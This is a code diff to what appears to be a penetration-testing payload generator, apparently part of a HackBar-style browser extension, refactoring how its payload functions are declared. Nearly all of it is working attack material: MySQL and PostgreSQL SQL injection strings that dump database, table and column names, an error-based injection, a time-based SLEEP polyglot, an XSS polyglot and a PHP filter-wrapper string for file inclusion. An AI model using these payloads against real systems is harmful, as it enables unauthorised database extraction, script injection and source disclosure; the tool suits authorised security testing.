@@ -1,16 +1,16 @@
-var Payload = {}
+window.Payload = {}
 
-Payload.SQLi = {
-  spaceToComment: function (value) {
+window.Payload.SQLi = {
+  spaceToComment: (value) => {
     return value.replace(/[^\S\r\n]+/g, '/**/')
   },
 
-  polyglot: function (value) {
+  polyglot: (value) => {
     return "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/"
   },
 
-  'MySQL': class {
-    static unionSelect ({ columns, position }) {
+  MySQL: {
+    unionSelect: ({ columns, position }) => {
       columns = parseInt(columns)
       if (isNaN(columns) === true) {
         return ''
@@ -18,9 +18,9 @@ Payload.SQLi = {
 
       return 'union select ' +
         Array.from(Array(columns + 1).keys()).slice(1).join(',')
-    }
+    },
 
-    static dumpDatabases ({ columns, position }) {
+    dumpDatabases: ({ columns, position }) => {
       columns = parseInt(columns)
       position = parseInt(position)
       if (isNaN(columns) === true || isNaN(position) === true ||
@@ -33,9 +33,9 @@ Payload.SQLi = {
 
       return 'union select ' + fields.join(',') +
         ' from information_schema.schemata'
-    }
+    },
 
-    static dumpTables ({ columns, position }) {
+    dumpTables: ({ columns, position }) => {
       columns = parseInt(columns)
       position = parseInt(position)
       if (isNaN(columns) === true || isNaN(position) === true ||
@@ -48,9 +48,9 @@ Payload.SQLi = {
 
       return 'union select ' + fields.join(',') +
         ' from information_schema.tables where table_schema=database()'
-    }
+    },
 
-    static dumpColumns ({ columns, position }) {
+    dumpColumns: ({ columns, position }) => {
       columns = parseInt(columns)
       position = parseInt(position)
       if (isNaN(columns) === true || isNaN(position) === true ||
@@ -63,24 +63,24 @@ Payload.SQLi = {
 
       return 'union select ' + fields.join(',') +
         ' from information_schema.columns where table_schema=database()'
-    }
+    },
 
-    static errorBased ({ columns, position }) {
+    errorBased: ({ columns, position }) => {
       return 'extractvalue(0x0a,concat(0x0a,(select database())))'
     }
   },
 
-  'PostgreSQL': class {
-    static unionSelect ({ columns, position }) {
+  PostgreSQL: {
+    unionSelect: ({ columns, position }) => {
       columns = parseInt(columns)
       if (isNaN(columns) === true) {
         return ''
       }
 
       return 'union select ' + Array(columns).fill('null').join(',')
-    }
+    },
 
-    static dumpDatabases ({ columns, position }) {
+    dumpDatabases: ({ columns, position }) => {
       columns = parseInt(columns)
       position = parseInt(position)
       if (isNaN(columns) === true || isNaN(position) === true ||
@@ -92,9 +92,9 @@ Payload.SQLi = {
       fields[position - 1] = "string_agg(datname, ',')"
 
       return 'union select ' + fields.join(',') + ' from pg_database'
-    }
+    },
 
-    static dumpTables ({ columns, position }) {
+    dumpTables: ({ columns, position }) => {
       columns = parseInt(columns)
       position = parseInt(position)
       if (isNaN(columns) === true || isNaN(position) === true ||
@@ -107,9 +107,9 @@ Payload.SQLi = {
 
       return ' union select ' + fields.join(',') +
         " from pg_tables where schemaname='public'"
-    }
+    },
 
-    static dumpColumns ({ columns, position }) {
+    dumpColumns: ({ columns, position }) => {
       columns = parseInt(columns)
       position = parseInt(position)
       if (isNaN(columns) === true || isNaN(position) === true ||
@@ -126,14 +126,14 @@ Payload.SQLi = {
   }
 }
 
-Payload.XSS = class {
-  static polyglot (value) {
+window.Payload.XSS = {
+  polyglot: (value) => {
     return "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
   }
 }
 
-Payload.LFI = class {
-  static phpWrapperBas64 (value) {
+window.Payload.LFI = {
+  phpWrapperBas64: (value) => {
     return 'php://filter/convert.base64-encode/resource=' + value
   }
 }
